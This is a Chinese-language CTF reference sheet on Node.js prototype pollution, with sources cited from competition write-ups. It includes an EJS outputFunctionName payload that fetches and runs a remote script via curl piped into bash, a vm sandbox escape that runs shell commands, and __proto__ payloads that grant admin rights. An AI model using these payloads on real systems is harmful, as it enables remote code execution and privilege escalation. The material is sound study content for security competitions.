# 10-Node原型链

## 总览

> **通路**: ① 直接执行\
> **来源**: 本地赛事资料整理。

***

## 一、原理

污染 `Object.prototype` → 影响所有对象 → 触发下游 gadget → RCE。

**必要条件**:

1. **污染入口**：`merge` / `clone` / `setValue` 类函数（如 lodash.merge、jQuery.extend、自写深拷贝）
2. `__proto__`\*\* 需经 **`JSON.parse`** 才成真键名\*\*（字面量对象中 `__proto__` 是原型引用，不是键）
3. 出口 gadget 使用了被污染的属性

```json
{"__proto__": {"polluted": "yes"}}
```

***

## 二、RCE 出口函数

`child_process` 的 `exec` / `execFile` / `fork` / `spawn`（+ Sync 版）

***

## 三、EJS 模板链 ★（CVE-2022-29078 风格）

**场景**: Express `app.set('view engine','ejs')` + `res.render('index', req.query)`（用户输入直接进 render 选项）

```json
{
  "constructor.prototype.outputFunctionName":
  "x;global.process.mainModule.require('child_process').exec('curl http://vps/bash.txt|bash');var x"
}
```

污染 `settings['view options']` / `opts.outputFunctionName` / `opts.shell` / `prepended include`。\
出处: `CTF中的EJS漏洞筆記.meta.md:15-17`、`2023西湖论剑web.meta.md:44`

### 变体：Node Unicode 损坏制造请求拆分

```plain
# 每字符 +0x100 → 污染 EJS outputFunctionName 走原型链 RCE
```

出处: `2023西湖论剑web.meta.md:9,44`

***

## 四、沙箱逃逸

### 4.1 Math 白名单（`[NPUCTF2020]验证🐎`）

```javascript
// 正则只允许 Math + 科学计数法
Math.constructor.constructor              // → Function
String.fromCharCode(...)                  // 拼命令
```

`Math.constructor = Function`，`Function("return process")()` 拿到 process。

### 4.2 vm / vm2 沙箱逃逸

```javascript
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

出处: `2022西湖论剑.meta.md:86`

### 4.3 现代 vm2 CVE

多个关键 sandbox escape，可利用 host RCE。

***

## 五、提权类（非 RCE，但常配合）

### 5.1 属性污染提权

```javascript
// auth[name] 数组形式被 Node 解析为对象
POST /api/profile/update   {"settings": {"__proto__": {"isAdmin": true}}}

// 数组形式使 Node 解析为对象 + __proto__ 给 message 对象加 admin:true
auth[name] →  {"__proto__":{"admin":true}}
```

出处: `2022巅峰极客.meta.md:118-133`、`2025 LitCTF.meta.md:16`

### 5.2 JWT secret\_key 污染

污染 `secret_key` → 伪造任意 JWT。\
出处: `2024强网拟态Nepnep.meta.md:18`

***

## 六、WebSocket 场景

```plain
# 服务端原型链污染专题
WebSocket 服务端合并用户消息对象时未过滤 __proto__
```

出处: `Server-Side Prototype Pollution on a WebSocket server – BreizhCTF Ariane Chat.meta.md`、`ACTF_Writeup_by_SU.meta.md:7`

***

## 七、其它语言的原型链污染

| 语言 | 手法 | 出处 |
| --- | --- | --- |
| **Python (pydash)** | 原型链污染 + Jinja2 全局变量劫持 | `2023IdekCTF.meta.md:7` |
| **Python (pickle)** | 需显式 `safe_modules=['os','builtins']` + `pickle reduce` RCE | `2024强网拟态Nepnep.meta.md:18` |

***

## 八、CTF 常见套路

1. **找 merge 点**：注册、改资料、配置合并接口
2. **确认可控**：能否传 `__proto__` 字面键
3. **找 gadget**：模板引擎、child\_process、require
4. \*\*注意 **`Object.freeze`：冻了 `Object`/`Math` 但**没冻 \*\*`.constructor` 仍可绕

```javascript
// 冻结绕过
Object.freeze(Object); Object.freeze(Math);
// 仍可通过 Object.constructor.prototype 访问
```

***

## 九、检测工具

* `prototype-pollution` Burp 插件
* 手工：`{"__proto__":{"x":"y"}}` → 检查 `({}).x`

***

## 十、相关 CVE

| CVE | 组件 |
| --- | --- |
| CVE-2022-29078 | EJS |
| CVE-2025-55182（React2Shell, CVSS 10.0） | 近期热点 RCE |
| 多个 vm2 escape | vm2 < 3.9.16 等 |
